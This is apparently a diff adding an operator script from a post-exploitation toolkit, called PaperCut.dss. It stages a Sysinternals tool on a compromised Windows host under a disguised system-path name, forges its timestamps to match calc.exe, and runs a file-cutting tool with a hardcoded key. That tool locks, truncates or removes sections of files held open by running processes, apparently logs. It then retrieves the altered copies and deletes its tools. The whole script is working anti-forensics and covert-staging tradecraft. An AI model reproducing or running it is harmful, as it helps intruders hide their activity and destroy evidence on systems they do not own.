@@ -1,0 +1,187 @@
+#-------------------------------------------------------------------------------
+# File: PaperCut.dss
+# Description: Uploads the handle.exe tool and PaperCut to edit files
+# 30 November 2009	Created...
+#
+#-------------------------------------------------------------------------------
+@include "Ops_GenericFunctions.dsi";
+@include "_Menu.dsi";
+@include "_LpHelperFunctions.dsi";
+# Get paths that we'll need later
+string $ScriptsDir;
+Ops_GetScriptsPath($ScriptsDir);
+string $sLogPath;
+_GetLpLogsDirectory($sLogPath);
+string $sSysPath;
+string $cutFile;
+Ops_GetSystemPath($sSysPath);
+string $remoteToolName = "";
+GetEnv("remoteToolName", $remoteToolName);
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\wshatm.exe";
+} 
+
+string $hexWorkShop = "c:\\PROGRA~1\\BREAKP~1\\HEXWOR~1.2\\hworks32.exe";
+string $hexRegistry = "HKCU\\Software\\BreakPoint\\Hex Workshop 4.2\\DocDefaults";
+string $wordPad = "C:\\PROGRA~1\\WINDOW~1\\ACCESS~1\\wordpad.exe";
+
+
+#####################################################################
+# Verify that we have privs to run
+if(!Ops_GetEnvBool("Ops_alreadyPriv")) {
+    echo "We don't have privs to run";
+    `script getPrivs.dss`;
+    return false;
+}
+
+#######################################################################
+# Verify command parameters
+if ($argc != 2 ) {
+    echo "Usage: $argv[0] -args <FileName> -project Ops";
+    return false;
+} else {
+    $cutFile = $argv[1];    
+	echo "Current file to cut: $argv[1]";	
+}
+
+#########################################################################
+# Present Menu to user, figure out what they want to try to do.
+
+string $items, $selected;
+int $chosen;
+_AppendString( $items, "Lock File   (for X minutes)");
+_AppendString( $items, "Trim File   (Adjust tail pointer)");
+_AppendString( $items, "Slice File  (Remove Section)");
+_ExecuteSimpleMenu("Welcome to Paper Cut v2.0.0.0", $items, $selected, $chosen);
+echo "$chosen - $selected was selected!";
+
+
+#########################################################################
+# Put up Handle to get PID and Handle value
+
+# Put up handle tool
+if (!prompt("Do you want to upload Handle as \"$remoteToolName\" ?")) {
+    GetInput("What do you want to upload the tool as?", $remoteToolName);
+}
+
+SetEnv("remoteToolName", "$remoteToolName");
+
+@echo on;
+
+while (`put Handle_3.2_Win32.exe -project Ops -name $remoteToolName` == false) {
+    if (prompt("File exists, delete \"$remoteToolName\"?")) {
+       `delete -file "$remoteToolName"`;
+	 sleep(200);
+    } else {
+       return false;
+    }
+}
+
+@echo off;
+# Match times to calc
+`matchfiletimes -src $sSysPath\\calc.exe -dst $remoteToolName`;
+
+@echo on;
+# Run handle <fileName>, will return needed values
+`run -command "$remoteToolName $cutFile" -redirect`;
+
+@echo off;
+# Remove handle from target
+`delete -file "$remoteToolName"`;
+
+# Prompt user for PID and handle value
+echo "*** Read output above!!! ";
+echo "**";
+echo "If return value = \"No matching handles found.\" there are no open handles";
+
+string $pid, $fileHandle, $fileName;
+if ( prompt("Does the file have an open handle?") ){
+   GetInput("What is the PID?", $pid );
+   GetInput("What is the File Handle?", $fileHandle);
+   GetInput("What is the full path name of file?", $fileName);
+} else {
+   echo "File is not locked, try logedit instead";
+   return true;
+}
+
+##########################################################################
+# Running PaperCut with PID and HANDLE
+
+# Exit if not specified
+int $startOffset = -1;
+int $endOffset = -1;
+if ($pid != "" && $fileHandle != "") {
+   # Put up Papercut
+   while (`put papercut_2.0.0.4_Win32.exe -project Ops -name $remoteToolName` == false) {
+      if (prompt("File exists, delete \"$remoteToolName\"?")) {
+         `delete -file "$remoteToolName"`;
+         sleep(200);
+      } else {
+         return false;
+      }
+   }
+   # Run check for Memory Linked files
+   @disablewow64 on;
+   `run -command "$remoteToolName #41sd941s!d -i $pid -m $fileHandle" -redirect`;
+   @disablewow64 off;
+    	
+   if(prompt("Did you get a return of M <PID>+?")) {
+      echo "Appears that this file is memory mapped, no dice with Paper Cut!";
+      return `delete -file "$remoteToolName"`;
+   } 
+	
+   # Using the menu in the beginning, try to perform operation.
+   string $localName;
+   if ($chosen == 0) {
+      string $lockTime;
+      GetInput("How many minutes did you want to lock $fileName?", $lockTime);
+      echo "Going to run papercut as $remoteToolName for $lockTime minutes";
+      echo "*************Make sure you delete $remoteToolName once stopped!!!";
+      `run -command "$remoteToolName #41sd941s!d -i $pid -h $fileHandle -t $lockTime"`;
+      return true;
+   } else {        
+      @record on;
+      `copyget $fileName`;
+	GetCmdData("FileStart::LocalName", $localName);
+	while(!`local dir -mask $localName -path $sLogPath\\GetFiles`) {
+	   echo "Waiting for File to download";
+	   sleep(5);
+	}
+      echo "File is at: $sLogPath\\$fileName";
+		
+      `local run -command "reg add $hexRegistry /v offsetMode /t REG_DWORD /d 1 /f'`;
+      `local run -command "cmd.exe /C $hexWorkShop $sLogPath\\GetFiles\\$localName"`;
+      `local run -command "cmd.exe /C $wordPad $sLogPath\\GetFiles\\$localName"`;
+ 
+     if ($chosen == 1) {
+         GetInput("What is the new tail offset of the file (decimel offset)[-1 to exit]:",$endOffset);
+	   if ($endOffset > 0) {
+	      `run -command "$remoteToolName #41sd941s!d -i $pid -h $fileHandle -o $endOffset" -redirect`;
+	   }
+      } else {
+         GetInput("What is the offset to begin the slice?(decimel offset)[-1 to exit]:",$startOffset);
+         GetInput("What is the new tail offset of the file (decimel offset)[-1 to exit]:",$endOffset);
+	   if ($endOffset > $startOffset && $startOffset > 0) {
+	      `run -command "$remoteToolName #41sd941s!d -i $pid -h $fileHandle -o $startOffSet -e $endOffset" -redirect`;
+	   }
+      }
+   
+      `delete -file "$remoteToolName"`;
+      echo "Getting a copy of cut file";
+        
+      `copyget $fileName`;
+      GetCmdData("FileStart::LocalName", $localName);
+      while(!`local dir -mask $localName -path $sLogPath\\GetFiles`) {
+         echo "Waiting for File to download";
+	   sleep(5);
+      }		
+
+      `local run -command "cmd.exe /C $wordPad $sLogPath\\GetFiles\\$localName"`;
+      echo "Have a nice day!";
+		
+      return true;
+   }
+} else {
+   echo "Improper input: PID: $pid FileHandle: $fileHandle";
+   return false;
+}
